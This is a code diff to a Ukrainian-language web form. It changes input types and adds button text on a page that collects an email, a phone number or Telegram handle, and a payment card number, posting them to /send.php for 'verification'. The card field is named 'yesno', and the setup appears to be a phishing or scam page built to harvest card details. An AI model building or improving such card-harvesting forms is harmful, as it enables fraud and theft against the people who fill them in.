@@ -74,7 +74,7 @@ fbq('track', 'PageView');
             </div>
                <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
             <div class="application-input">
-              <input type="text" name="email" placeholder="Ваш Email" required="">
+              <input type="email" name="email" placeholder="Ваш Email" required="">
             </div>
                 <!-- /.form-group -->
               <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
@@ -87,13 +87,13 @@ fbq('track', 'PageView');
             </div>
              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
             <div class="application-input">
-              <input type="text" name="namber" placeholder="Ваш номер телефону або @username в TG" required="">
+              <input type="tel" name="namber" placeholder="Ваш номер телефону або @username в TG" required="">
             </div>
                 <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
             <div class="application-input">
-              <input type="text" name="yesno" placeholder="Ваша карта, для оплати" required="">
+              <input type="card" name="yesno" placeholder="Ваша карта (для оплати)" required="">
               <div  style="display:flex;justify-content:center;align-items:center;">
-                <label data-aos="fade-right" for="messanger" style="margin-right:15px;font-weight:bold;">Спосіб зв'язку:</label>
+                <label for="messanger" style="margin-right:15px;font-weight:bold;">Спосіб зв'язку:</label>
               <select name="messanger" id="messanger">
                 <option value="Whatsapp-Messenger">WhatsApp Messenger</option>
                 <option selected value="Telegram">Telegram</option>
@@ -106,8 +106,10 @@ fbq('track', 'PageView');
         
                 <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
         
-                <button type="submit" class="form-button">Відправити на перевірку</button>
+               <button type="submit" class="form-button">Відправити на перевірку <br>  (Загрузка 5 секунд) </button>
               </form>
+              <h2>Натискать на кнопку потрібно 1 раз!</h2>
+
             </div>
           </div>
           <!-- /.col-md-6 offset-md-3 -->
